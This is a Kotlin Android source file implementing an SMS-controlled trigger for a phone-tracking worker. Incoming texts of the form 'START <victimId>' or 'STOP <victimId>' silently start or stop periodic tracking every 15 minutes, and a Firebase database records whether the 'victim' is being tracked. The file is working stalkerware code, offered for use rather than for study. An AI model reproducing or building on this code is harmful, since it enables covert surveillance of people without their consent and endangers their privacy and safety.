package com.theprogxy.tamtam

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.provider.Telephony
import androidx.work.Data
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkInfo
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class SmsReceiverWorker(private val context: Context, private val params: WorkerParameters) : Worker(context, params) {
    private lateinit var latch: CountDownLatch

    private fun setIsTracked(isTracked: Boolean) {
        val database = Firebase.database.reference
        val victimId = this.params.inputData.getString("victimId").toString()
        database.child(victimId).child("isTracked").setValue(isTracked)
        return
    }

    private val smsReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val smsMessage = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            val body = smsMessage[0].messageBody

            // Check if any of the work info objects are in ENQUEUED or RUNNING state
            val isWorking : Boolean = WorkManager.getInstance(context).getWorkInfosByTag("Tracking").get().any { workInfo ->
                workInfo.state == WorkInfo.State.ENQUEUED || workInfo.state == WorkInfo.State.RUNNING
            }

            val victimId = params.inputData.getString("victimId").toString()

            if (body == "START $victimId" && !isWorking) {
                val data = Data.Builder().putString("victimId", victimId).build()
                val workRequest = PeriodicWorkRequestBuilder<TrackerWorker>(15, TimeUnit.MINUTES).setInputData(data).addTag("Tracking").build()
                WorkManager.getInstance(context).enqueue(workRequest)
                setIsTracked(true)
            } else if (body == "STOP $victimId" && isWorking) {
                WorkManager.getInstance(context).cancelAllWorkByTag("Tracking")
                setIsTracked(false)
            }

            latch.countDown()
        }
    }

    override fun doWork(): Result {
        latch = CountDownLatch(150)
        context.registerReceiver(smsReceiver, IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION))
        latch.await(14, TimeUnit.MINUTES)
        context.unregisterReceiver(smsReceiver)
        return Result.success()
    }
}